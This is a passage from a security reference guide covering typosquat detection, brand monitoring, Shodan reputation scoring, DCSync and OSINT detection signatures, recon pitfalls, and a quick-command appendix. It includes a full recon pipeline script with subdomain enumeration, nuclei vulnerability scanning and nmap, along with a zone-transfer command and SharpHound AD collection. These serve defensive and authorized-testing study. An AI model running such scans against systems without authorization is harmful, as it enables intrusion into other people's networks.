| **insertion** | Added characters | `examplle.com` |
| **replacement** | Adjacent keyboard keys | `examplw.com` |
| **hyphenation** | Added hyphens | `exam-ple.com` |
| **subdomain** | Dots inserted | `exam.ple.com` |
| **vowel-swap** | Swapped vowels | `exemplo.com` |
| **addition** | Appended characters | `examplee.com` |
| **dictionary** | Common words appended | `example-login.com` |

### 9.3 Risk Scoring for Typosquats

| Factor | Risk Points |
|--------|------------|
| High web similarity (ssdeep > 50%) | +40 |
| Has MX records (email capable) | +20 |
| Recently registered (<30 days) | +30 |
| Homoglyph attack (visually identical) | +25 |
| Different IP from legitimate domain | +10 |
| High ssdeep + MX + recent = phishing | **HIGH RISK (≥50)** |

### 9.4 Brand Monitoring Across Channels

| Channel | Detection Method | Tools |
|---------|-----------------|-------|
| **Domains** | dnstwist permutations, CT log monitoring | dnstwist, Certstream, crt.sh |
| **Social Media** | Profile name matching, content analysis | Twitter API, manual search |
| **Mobile Apps** | App store name/icon similarity | Google Play scraping |
| **Dark Web** | Forum scraping, marketplace tracking | Tor + manual research |
| **Email** | DMARC monitoring, phishing reports | DMARC aggregate reports |

### 9.5 Takedown Workflow

1. **Detect** → dnstwist scan + CT log monitoring
2. **Verify** → Check web content, SSL certs, MX records
3. **Document** → Screenshot, WHOIS, DNS records, ssdeep score
4. **Report** → Submit to registrar abuse team with evidence
5. **Block** → Add to proxy/firewall blocklists
6. **Monitor** → Continuous scanning for re-registration

---

## 10. Recon Pipelines & Automation {#10-pipelines}

### 10.1 Complete Recon Pipeline

```bash
#!/bin/bash
TARGET="example.com"

# Phase 1: Passive subdomain enumeration
subfinder -d $TARGET -all -o subfinder.txt
amass enum -passive -d $TARGET -o amass_passive.txt
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | \
  jq -r '.[].name_value' | sort -u > ct.txt

# Phase 2: Combine and deduplicate
cat subfinder.txt amass_passive.txt ct.txt | sort -u > all_subdomains.txt
echo "[*] Total unique subdomains: $(wc -l < all_subdomains.txt)"

# Phase 3: Active DNS resolution
cat all_subdomains.txt | dnsx -a -resp -o resolved.txt

# Phase 4: HTTP probing with tech detection
cat resolved.txt | httpx -title -status-code -tech-detect -o live_hosts.txt

# Phase 5: Screenshot for visual recon
cat live_hosts.txt | httpx -silent | gowitness file -f - -P screenshots/

# Phase 6: Vulnerability scanning
cat live_hosts.txt | nuclei -t cves/ -severity critical,high -o vulns.txt

# Phase 7: Port scanning on unique IPs
cut -d' ' -f1 live_hosts.txt | sort -u > unique_ips.txt
nmap -sV -T4 -iL unique_ips.txt -oX nmap_results.xml

# Phase 8: Generate report
echo "=== Recon Report for $TARGET ==="
echo "Subdomains: $(wc -l < all_subdomains.txt)"
echo "Live hosts: $(wc -l < live_hosts.txt)"
echo "Vulnerabilities: $(wc -l < vulns.txt)"
```

### 10.2 Shodan Infrastructure Correlation

```python
def correlate_infrastructure(api, ip_address):
    """Find related infrastructure based on shared attributes."""
    host = api.host(ip_address)
    correlations = {"same_org": [], "shared_ssl": []}
    
    # Search by organization
    org = host.get("org", "")
    if org:
        results = api.search(f'org:"{org}"', limit=20)
        correlations["same_org"] = [
            {"ip": m["ip_str"], "port": m["port"], "product": m.get("product", "")}
            for m in results.get("matches", [])
        ]
    
    # Search by SSL certificate
    for svc in host.get("data", []):
        if "ssl" in svc:
            cn = svc["ssl"].get("cert", {}).get("subject", {}).get("CN", "")
            if cn:
                results = api.search(f'ssl.cert.subject.CN:"{cn}"', limit=20)
                correlations["shared_ssl"] = [
                    {"ip": m["ip_str"], "cn": cn}
                    for m in results.get("matches", [])
                ]
    
    return correlations
```

### 10.3 Shodan IP Reputation Scoring

```python
def calculate_reputation(data):
    score = 0
    factors = []
    
    # Vulnerability count
    vuln_count = len(data.get("vulns", []))
    if vuln_count > 10: score += 40; factors.append(f"{vuln_count} vulns")
    elif vuln_count > 5: score += 25; factors.append(f"{vuln_count} vulns")
    elif vuln_count > 0: score += 10; factors.append(f"{vuln_count} vulns")
    
    # Suspicious ports
    suspicious = {4444, 5555, 6666, 8888, 9090, 1234, 31337, 6667, 6697}
    open_sus = set(data.get("ports", [])).intersection(suspicious)
    if open_sus: score += 15; factors.append(f"suspicious ports: {open_sus}")
    
    # Excessive open ports
    if len(data.get("ports", [])) > 20:
        score += 15; factors.append("excessive open ports")
    
    level = ("critical" if score >= 50 else "high" if score >= 35
             else "medium" if score >= 15 else "low")
    
    return {"score": score, "level": level, "factors": factors}
```

---

## 11. Detection Signatures (Blue Team) {#11-detection}

### 11.1 DCSync Detection

| Indicator | Detection Method |
|-----------|-----------------|
| DRSGetNCChanges RPC from non-DC sources | Network monitoring for DRSUAPI traffic from unusual IPs |
| Event 4662 with GUIDs 1131f6aa-/1131f6ad- | Windows Security Log on DC |
| Event 4624 with impossible SIDs | Logon event anomalies |
| ACL modifications on domain root | Event 5136 (directory service changes) |

### 11.2 OSINT Detection (When You're the Target)

| Activity | How It Appears in Logs |
|----------|----------------------|
| DNS zone transfer attempt | DNS server logs: AXFR query from external IP |
| Subdomain brute-force | DNS query volume spike for non-existent names |
| Shodan/Censys scanning | Increased traffic to all ports on public IPs |
| CT log queries | No log on your side (passive, untraceable) |
| GitHub secret scanning | GitHub audit logs: code search queries |
| SpiderFoot/Amass queries | No log on your side (queries third-party APIs) |

---

## 12. Common Pitfalls {#12-pitfalls}

### Recon Pitfalls

1. **Single-tool dependency**: Each subdomain tool queries different sources. Using only Subfinder misses assets found by Amass, and vice versa. Always combine 3+ tools.
2. **Wildcard DNS false positives**: Not checking for wildcard records causes enumeration to return false subdomains that all resolve to the same IP.
3. **Missing cloud storage**: S3, Azure Blob, and GCS buckets are often overlooked. Always check for `target-com`, `target-backup`, `target-dev` bucket patterns.
4. **Rate limiting**: Aggressive DNS brute-forcing triggers rate limits or DDoS protection. Use rate-limiting flags and respect retry-after headers.
5. **Forgetting TXT records**: TXT records often contain API keys, verification tokens, and internal comments that leak sensitive information.

### OSINT Pitfalls

1. **Digital footprint**: Visiting a target's website or Shodan-queried IP can alert the adversary. Use Tor or VPN with a dedicated OSINT VM.
2. **Confirmation bias**: Maltego graphs can create false connections. Verify each pivot independently before treating as confirmed.
3. **Outdated data**: WHOIS privacy and bulletproof hosting rotate frequently. Always check timestamps — 6-month-old passive DNS may be invalid.
4. **Attribution overconfidence**: Infrastructure overlap does not guarantee same threat actor. False flags deliberately share indicators across groups.
5. **Legal boundaries**: Some "OSINT" tools perform active scans. Confirm tool behavior before use against external targets without authorization.

### IOC Pitfalls

1. **Blocking shared infrastructure**: CDN IPs (Cloudflare, CloudFront) host thousands of legitimate sites. Block the domain, not the IP.
2. **VT score obsession**: Zero-day malware scores 0 on VirusTotal initially. Use 3+ independent sources for high-stakes decisions.
3. **Missing defanging**: Pasting live IOCs in emails or docs can trigger automated URL scanners or phishing tools.
4. **No expiration policy**: IOCs without TTLs accumulate in blocklists indefinitely, generating false positives as IPs are repurposed.
5. **Including internal IPs**: Never share internal IP addresses or hostnames in IOC packages shared with partners (information leakage).

---

## Appendix: Quick Reference Commands

### DNS
```bash
dig NS target.com +short           # Name servers
dig MX target.com +short           # Mail servers
dig TXT target.com +short          # TXT records (SPF, DKIM, DMARC)
dig AXFR target.com @ns1.target.com  # Zone transfer attempt
dig SOA target.com +short          # Zone metadata
```

### Subdomain Discovery
```bash
subfinder -d target.com -all -o subs.txt
amass enum -passive -d target.com -o amass.txt
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

### Service Discovery
```bash
cat subs.txt | httpx -title -status-code -tech-detect
cat subs.txt | httpx -ports 80,443,8080,8443
nmap -sV -T4 target_ip
```

### AD Recon
```bash
# BloodHound CE
docker compose up -d
# SharpHound
.\SharpHound.exe -c All --outputdirectory C:\Temp --zipfilename bh.zip
```

### Shodan
```bash
shodan init YOUR_KEY
shodan host target_ip
shodan search "ssl.cert.subject.cn:target.com"
curl -s "https://internetdb.shodan.io/target_ip"
```

### IOC Enrichment
```bash
# VirusTotal
curl "https://www.virustotal.com/api/v3/files/HASH" -H "x-apikey: KEY"
# AbuseIPDB
curl "https://api.abuseipdb.com/api/v2/check?ipAddress=IP" -H "Key: KEY"
# MalwareBazaar
curl -X POST "https://mb-api.abuse.ch/api/v1/" -d "query=get_info&hash=HASH"
```

---

*Sources: 15 Anthropic Cybersecurity Skills (performing-open-source-intelligence-gathering, conducting-domain-persistence-with-dcsync, performing-dns-enumeration-and-zone-transfer, performing-subdomain-enumeration-with-subfinder, performing-ip-reputation-analysis-with-shodan, performing-active-directory-bloodhound-analysis, collecting-open-source-intelligence, performing-osint-with-spiderfoot, conducting-external-reconnaissance-with-osint, analyzing-certificate-transparency-for-phishing, performing-brand-monitoring-for-impersonation, analyzing-typosquatting-domains-with-dnstwist, collecting-indicators-of-compromise, analyzing-indicators-of-compromise) + security-org-reconnaissance (.agents/skills)*
